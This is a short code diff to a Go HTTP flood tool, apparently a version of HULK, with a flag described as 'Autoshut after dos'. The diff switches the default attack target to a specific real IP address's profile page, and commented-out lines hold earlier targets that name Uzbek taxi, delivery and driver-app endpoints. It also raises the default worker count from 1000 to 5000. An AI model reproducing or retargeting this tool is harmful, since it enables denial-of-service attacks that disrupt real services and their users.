@@ -87,8 +87,8 @@ func main() {
 	flag.BoolVar(&version, "version", false, "print version and exit")
 	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
 	// flag.StringVar(&site, "site", "http://map.uz.taxi:8080/reverse?format=jsonv2&lat=41.28407468291545&lon=69.26207811157667&addressdetails=1&accept-language=en", "Destination site.")
-	// flag.StringVar(&site, "site", "https://express24.uz/rest/v1/tariff/polygons", "Destination site.")
-	flag.StringVar(&site, "site", "https://217.30.171.176:3443/api/driver-app/1.0/dict/countries", "Destination site.")
+	flag.StringVar(&site, "site", "http://213.230.120.147/cabinet/#profile", "Destination site.")
+	// flag.StringVar(&site, "site", "https://217.30.171.176:3443/api/driver-app/1.0/dict/countries", "Destination site.")
 	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
 	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
@@ -97,7 +97,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 1000
+		maxproc = 5000
 	}
 
 	u, err := url.Parse(site)
